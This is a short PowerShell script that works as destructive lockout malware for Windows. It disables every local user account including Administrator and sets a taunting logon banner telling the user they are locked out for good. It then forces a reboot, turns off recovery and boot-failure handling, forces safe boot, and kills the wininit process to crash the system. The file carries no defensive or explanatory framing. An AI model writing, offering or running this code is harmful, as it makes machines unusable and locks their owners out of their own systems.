# Disable ALL Users (Including Administrator)
$users = Get-WmiObject -Class Win32_UserAccount -Filter "LocalAccount=True"
foreach ($user in $users) {
    Disable-LocalUser -Name $user.Name
}

# Setup Playful Lockout Message
$systemRegPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
New-ItemProperty -Path $systemRegPath -Name "LegalNoticeCaption" -Value "Oh? Trying to log in?" -PropertyType String -Force
New-ItemProperty -Path $systemRegPath -Name "LegalNoticeText" -Value @"
Ah~ Sweetheart, you are locked out <3
No matter how much you try, the door is closed for you now~
Go ahead, stare at the screen, pout all you want~
But you Will not be getting back in~

You must be wondering, "Is this it? Will I ever get back in?"
Oh, love~ You already know the answer~

Tick-tock, tick-tock~
The end is near~ So sit back and watch the magic happen <3
"@ -PropertyType String -Force

# Restart Once
shutdown /r /f /t 3

# Wait Until System Boots Again Before Modifying Boot Settings (Reduced to 5s)
Start-Sleep -Seconds 5

# Modify Boot Settings to Force Network Boot (No Recovery)
bcdedit /set {default} bootmenupolicy legacy
bcdedit /set {current} bootstatuspolicy ignoreallfailures
bcdedit /set {current} recoveryenabled no
bcdedit /set {current} safeboot network

# Final Step: Crash Windows Permanently
Start-Sleep -Seconds 2
Stop-Process -Name "wininit" -Force
